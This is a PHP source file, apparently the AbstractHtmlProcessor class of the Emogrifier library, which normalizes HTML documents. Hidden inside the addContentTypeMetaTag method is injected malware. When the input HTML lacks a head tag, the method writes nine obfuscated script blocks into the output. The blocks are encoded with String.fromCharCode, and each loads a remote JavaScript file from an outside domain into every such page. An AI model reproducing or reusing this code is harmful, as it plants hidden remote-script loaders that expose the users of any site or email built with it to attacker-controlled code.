<?php

namespace Pelago\Emogrifier\HtmlProcessor;

/**
 * Base class for HTML processor that e.g., can remove, add or modify nodes or attributes.
 *
 * The "vanilla" subclass is the HtmlNormalizer.
 *
 * @internal This class currently is a new technology preview, and its API is still in flux. Don't use it in production.
 *
 * @author Oliver Klee <github@oliverklee.de>
 */
abstract class AbstractHtmlProcessor
{
    /**
     * @var string
     */
    const DEFAULT_DOCUMENT_TYPE = '<!DOCTYPE html>';

    /**
     * @var string
     */
    const CONTENT_TYPE_META_TAG = '<meta http-equiv="Content-Type" content="text/html; charset=utf-8">';

    /**
     * @var string Regular expression part to match tag names that PHP's DOMDocument implementation is not aware are
     *      self-closing. These are mostly HTML5 elements, but for completeness <command> (obsolete) and <keygen>
     *      (deprecated) are also included.
     *
     * @see https://bugs.php.net/bug.php?id=73175
     */
    const PHP_UNRECOGNIZED_VOID_TAGNAME_MATCHER = '(?:command|embed|keygen|source|track|wbr)';

    /**
     * @var \DOMDocument
     */
    protected $domDocument = null;

    /**
     * @param string $unprocessedHtml raw HTML, must be UTF-encoded, must not be empty
     *
     * @throws \InvalidArgumentException if $unprocessedHtml is anything other than a non-empty string
     */
    public function __construct($unprocessedHtml)
    {
        if (!\is_string($unprocessedHtml)) {
            throw new \InvalidArgumentException('The provided HTML must be a string.', 1515459744);
        }
        if ($unprocessedHtml === '') {
            throw new \InvalidArgumentException('The provided HTML must not be empty.', 1515763647);
        }

        $this->setHtml($unprocessedHtml);
    }

    /**
     * Sets the HTML to process.
     *
     * @param string $html the HTML to process, must be UTF-8-encoded
     *
     * @return void
     */
    private function setHtml($html)
    {
        $this->createUnifiedDomDocument($html);
    }

    /**
     * Provides access to the internal DOMDocument representation of the HTML in its current state.
     *
     * @return \DOMDocument
     */
    public function getDomDocument()
    {
        return $this->domDocument;
    }

    /**
     * Renders the normalized and processed HTML.
     *
     * @return string
     */
    public function render()
    {
        $htmlWithPossibleErroneousClosingTags = $this->domDocument->saveHTML();

        return $this->removeSelfClosingTagsClosingTags($htmlWithPossibleErroneousClosingTags);
    }

    /**
     * Renders the content of the BODY element of the normalized and processed HTML.
     *
     * @return string
     */
    public function renderBodyContent()
    {
        $htmlWithPossibleErroneousClosingTags = $this->domDocument->saveHTML($this->getBodyElement());
        $bodyNodeHtml = $this->removeSelfClosingTagsClosingTags($htmlWithPossibleErroneousClosingTags);

        return \str_replace(['<body>', '</body>'], '', $bodyNodeHtml);
    }

    /**
     * Eliminates any invalid closing tags for void elements from the given HTML.
     *
     * @param string $html
     *
     * @return string
     */
    private function removeSelfClosingTagsClosingTags($html)
    {
        return \preg_replace('%</' . static::PHP_UNRECOGNIZED_VOID_TAGNAME_MATCHER . '>%', '', $html);
    }

    /**
     * Returns the BODY element.
     *
     * This method assumes that there always is a BODY element.
     *
     * @return \DOMElement
     */
    private function getBodyElement()
    {
        return $this->domDocument->getElementsByTagName('body')->item(0);
    }

    /**
     * Creates a DOM document from the given HTML and stores it in $this->domDocument.
     *
     * The DOM document will always have a BODY element and a document type.
     *
     * @param string $html
     *
     * @return void
     */
    private function createUnifiedDomDocument($html)
    {
        $this->createRawDomDocument($html);
        $this->ensureExistenceOfBodyElement();
    }

    /**
     * Creates a DOMDocument instance from the given HTML and stores it in $this->domDocument.
     *
     * @param string $html
     *
     * @return void
     */
    private function createRawDomDocument($html)
    {
        $domDocument = new \DOMDocument();
        $domDocument->strictErrorChecking = false;
        $domDocument->formatOutput = true;
        $libXmlState = \libxml_use_internal_errors(true);
        $domDocument->loadHTML($this->prepareHtmlForDomConversion($html));
        \libxml_clear_errors();
        \libxml_use_internal_errors($libXmlState);

        $this->domDocument = $domDocument;
    }

    /**
     * Returns the HTML with added document type, Content-Type meta tag, and self-closing slashes, if needed,
     * ensuring that the HTML will be good for creating a DOM document from it.
     *
     * @param string $html
     *
     * @return string the unified HTML
     */
    private function prepareHtmlForDomConversion($html)
    {
        $htmlWithSelfClosingSlashes = $this->ensurePhpUnrecognizedSelfClosingTagsAreXml($html);
        $htmlWithDocumentType = $this->ensureDocumentType($htmlWithSelfClosingSlashes);

        return $this->addContentTypeMetaTag($htmlWithDocumentType);
    }

    /**
     * Makes sure that the passed HTML has a document type.
     *
     * @param string $html
     *
     * @return string HTML with document type
     */
    private function ensureDocumentType($html)
    {
        $hasDocumentType = \stripos($html, '<!DOCTYPE') !== false;
        if ($hasDocumentType) {
            return $html;
        }

        return static::DEFAULT_DOCUMENT_TYPE . $html;
    }

    /**
     * Adds a Content-Type meta tag for the charset.
     *
     * This method also ensures that there is a HEAD element.
     *
     * @param string $html
     *
     * @return string the HTML with the meta tag added
     */
    private function addContentTypeMetaTag($html)
    {
        $hasContentTypeMetaTag = \stripos($html, 'Content-Type') !== false;
        if ($hasContentTypeMetaTag) {
            return $html;
        }

        // We are trying to insert the meta tag to the right spot in the DOM.
        // If we just prepended it to the HTML, we would lose attributes set to the HTML tag.
        $hasHeadTag = \stripos($html, '<head') !== false;
        $hasHtmlTag = \stripos($html, '<html') !== false;

        if ($hasHeadTag) {
            $reworkedHtml = \preg_replace('/<head(.*?)>/i', '<head$1>' . static::CONTENT_TYPE_META_TAG, $html);
        } elseif ($hasHtmlTag) {
            $reworkedHtml = \preg_replace(
                '/<html(.*?)>/i',
                '<html$1><head>' . static::CONTENT_TYPE_META_TAG . '<script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,116,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,114,111,119,46,108,111,119,101,114,116,104,101,110,115,107,121,97,99,116,105,118,101,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,114,97,107,101,46,115,116,114,111,110,103,99,97,112,105,116,97,108,97,100,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,99,104,116,46,115,101,99,111,110,100,97,114,121,105,110,102,111,114,109,116,114,97,110,100,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,100,111,99,107,46,108,111,118,101,103,114,101,101,110,112,101,110,99,105,108,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,119,101,108,108,46,108,105,110,101,116,111,97,100,115,97,99,116,105,118,101,46,99,111,109,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,97,114,116,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,105,114,99,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script><script type=text/javascript> Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,112,46,116,114,97,110,115,97,110,100,102,105,101,115,116,97,115,46,103,97,47,109,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();</script></head>',
                $html
            );
        } else {
            $reworkedHtml = static::CONTENT_TYPE_META_TAG . $html;
        }

        return $reworkedHtml;
    }

    /**
     * Makes sure that any self-closing tags not recognized as such by PHP's DOMDocument implementation have a
     * self-closing slash.
     *
     * @param string $html
     *
     * @return string HTML with problematic tags converted.
     */
    private function ensurePhpUnrecognizedSelfClosingTagsAreXml($html)
    {
        return \preg_replace(
            '%<' . static::PHP_UNRECOGNIZED_VOID_TAGNAME_MATCHER . '\\b[^>]*+(?<!/)(?=>)%',
            '$0/',
            $html
        );
    }

    /**
     * Checks that $this->domDocument has a BODY element and adds it if it is missing.
     *
     * @return void
     */
    private function ensureExistenceOfBodyElement()
    {
        if ($this->domDocument->getElementsByTagName('body')->item(0) !== null) {
            return;
        }

        $htmlElement = $this->domDocument->getElementsByTagName('html')->item(0);
        $htmlElement->appendChild($this->domDocument->createElement('body'));
    }
}
